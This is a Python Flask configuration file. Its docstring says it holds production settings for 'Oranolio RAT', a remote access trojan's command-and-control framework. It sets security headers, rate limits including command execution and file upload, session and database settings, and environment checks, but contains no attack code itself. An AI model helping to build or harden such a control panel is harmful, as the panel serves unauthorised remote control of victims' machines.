#!/usr/bin/env python3
"""
Production Configuration for Oranolio RAT - Elite C2 Framework
Production-hardened settings and configurations
"""

import os
import logging
from pathlib import Path

class ProductionConfig:
    """Production configuration settings"""
    
    # Security Settings
    DEBUG = False
    TESTING = False
    
    # Logging Configuration
    LOG_LEVEL = logging.INFO
    LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    
    # Security Headers
    SECURITY_HEADERS = {
        'X-Frame-Options': 'DENY',
        'X-Content-Type-Options': 'nosniff',
        'X-XSS-Protection': '1; mode=block',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'
    }
    
    # Rate Limiting
    RATE_LIMITS = {
        'login_attempts': 5,
        'api_requests': 1000,
        'command_execution': 30,
        'file_upload': 10
    }
    
    # Session Configuration
    SESSION_TIMEOUT = 3600  # 1 hour
    SESSION_COOKIE_SECURE = True
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    
    # Database Configuration
    DATABASE_POOL_SIZE = 10
    DATABASE_POOL_TIMEOUT = 30
    DATABASE_POOL_RECYCLE = 3600
    
    # File Upload Limits
    MAX_FILE_SIZE = 16 * 1024 * 1024  # 16MB
    ALLOWED_EXTENSIONS = {
        'txt', 'log', 'json', 'csv', 'xml', 'yaml', 'yml',
        'py', 'js', 'html', 'css', 'md', 'sh', 'bat'
    }
    
    # Command Execution Limits
    MAX_COMMAND_LENGTH = 1000
    COMMAND_TIMEOUT = 30
    MAX_CONCURRENT_COMMANDS = 10
    
    # Monitoring Configuration
    METRICS_RETENTION_DAYS = 30
    LOG_RETENTION_DAYS = 90
    PERFORMANCE_MONITORING = True
    
    # Error Handling
    ERROR_RECOVERY_ATTEMPTS = 3
    ERROR_RECOVERY_DELAY = 5  # seconds
    
    # Cleanup Settings
    CLEANUP_INTERVAL = 3600  # 1 hour
    MAX_LOG_FILES = 100
    MAX_TEMP_FILES = 50
    
    @classmethod
    def apply_to_app(cls, app):
        """Apply production configuration to Flask app"""
        app.config.update({
            'DEBUG': cls.DEBUG,
            'TESTING': cls.TESTING,
            'SECRET_KEY': os.getenv('SECRET_KEY', 'change-this-in-production'),
            'SESSION_COOKIE_SECURE': cls.SESSION_COOKIE_SECURE,
            'SESSION_COOKIE_HTTPONLY': cls.SESSION_COOKIE_HTTPONLY,
            'SESSION_COOKIE_SAMESITE': cls.SESSION_COOKIE_SAMESITE,
            'MAX_CONTENT_LENGTH': cls.MAX_FILE_SIZE
        })
        
        # Configure logging
        logging.basicConfig(
            level=cls.LOG_LEVEL,
            format=cls.LOG_FORMAT,
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('logs/production.log')
            ]
        )
        
        # Add security headers
        @app.after_request
        def add_security_headers(response):
            for header, value in cls.SECURITY_HEADERS.items():
                response.headers[header] = value
            return response
        
        return app
    
    @classmethod
    def validate_environment(cls):
        """Validate production environment"""
        required_vars = [
            'SECRET_KEY',
            'JWT_SECRET',
            'FROM_EMAIL',
            'DATABASE_URL'
        ]
        
        missing_vars = []
        for var in required_vars:
            if not os.getenv(var):
                missing_vars.append(var)
        
        if missing_vars:
            raise ValueError(f"Missing required environment variables: {', '.join(missing_vars)}")
        
        return True
    
    @classmethod
    def get_database_config(cls):
        """Get database configuration"""
        return {
            'url': os.getenv('DATABASE_URL', 'sqlite:///data/main.db'),
            'pool_size': cls.DATABASE_POOL_SIZE,
            'pool_timeout': cls.DATABASE_POOL_TIMEOUT,
            'pool_recycle': cls.DATABASE_POOL_RECYCLE
        }
    
    @classmethod
    def get_redis_config(cls):
        """Get Redis configuration"""
        return {
            'url': os.getenv('REDIS_URL', 'redis://localhost:6379/0'),
            'decode_responses': True,
            'socket_keepalive': True,
            'socket_keepalive_options': {}
        }

# Production environment check
def is_production():
    """Check if running in production environment"""
    return os.getenv('FLASK_ENV', 'development') == 'production'

def get_config():
    """Get appropriate configuration based on environment"""
    if is_production():
        return ProductionConfig()
    else:
        # Return development config
        from config import Config
        return Config

# Example usage
if __name__ == "__main__":
    print("Production Configuration")
    print("=" * 30)
    print(f"Debug Mode: {ProductionConfig.DEBUG}")
    print(f"Log Level: {ProductionConfig.LOG_LEVEL}")
    print(f"Session Timeout: {ProductionConfig.SESSION_TIMEOUT}s")
    print(f"Max File Size: {ProductionConfig.MAX_FILE_SIZE / (1024*1024):.1f}MB")
    print(f"Rate Limits: {ProductionConfig.RATE_LIMITS}")
    print("Production configuration ready!")